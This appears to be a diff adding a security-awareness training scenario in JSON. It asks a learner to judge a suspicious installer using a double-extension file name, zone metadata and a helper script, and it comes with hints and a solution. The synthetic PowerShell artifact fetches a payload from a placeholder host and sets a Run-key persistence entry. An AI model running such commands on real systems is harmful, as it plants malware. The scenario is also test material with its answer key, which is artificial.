@@ -1,0 +1,37 @@
+{
+  "id": "suspicious-download",
+  "name": "Suspicious Download",
+  "difficulty": "intermediate",
+  "category": "file-trust",
+  "objective": "Determine whether a recently downloaded installer should be trusted before execution.",
+  "brief": "A user downloaded a small installer from a mirror link. The file name, origin metadata and companion script do not fully match the vendor story.",
+  "success_criteria": [
+    "Identify the origin mismatch.",
+    "Identify the double-extension lure.",
+    "Explain why the script behavior does not match the stated installer purpose."
+  ],
+  "artifacts": [
+    {
+      "path": "Downloads/Invoice_Viewer_Update.pdf.exe.txt",
+      "content": "Synthetic placeholder for a downloaded executable.\\nName: Invoice_Viewer_Update.pdf.exe\\nSize: 4.8 MB\\nHash: {{CASE_HASH}}\\nPublisher: Unknown\\n"
+    },
+    {
+      "path": "metadata/zone_identifier.txt",
+      "content": "[ZoneTransfer]\\nZoneId=3\\nHostUrl=https://mirror-downloads.example.invalid/invoice-viewer/update\\nReferrerUrl=https://forum-post.example.invalid/thread/981\\n"
+    },
+    {
+      "path": "Downloads/install_helper.ps1.txt",
+      "content": "# Synthetic script artifact - do not execute\\n$u='https://example.invalid/payload.bin'\\n# simulated download behavior\\nInvoke-WebRequest $u -OutFile $env:TEMP\\\\update.bin\\nNew-ItemProperty -Path HKCU:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run -Name InvoiceUpdate -Value $env:TEMP\\\\update.bin\\n"
+    },
+    {
+      "path": "notes/user_report.txt",
+      "content": "The user expected a PDF reader update but received a file named Invoice_Viewer_Update.pdf.exe.\\nThe download came from a forum mirror, not the vendor site.\\n"
+    }
+  ],
+  "hints": [
+    "Start with the file name. Ask what the final extension actually is.",
+    "Compare the expected vendor flow with the recorded origin URL.",
+    "The helper script creates persistence. That behavior is not normal for a simple viewer update."
+  ],
+  "solution": "The file should not be trusted. It uses a document-like name with an executable ending, it was downloaded from an indirect mirror, and the companion script simulates persistence through a Run key. The correct recommendation is to avoid execution and obtain software only from a verified vendor source."
+}
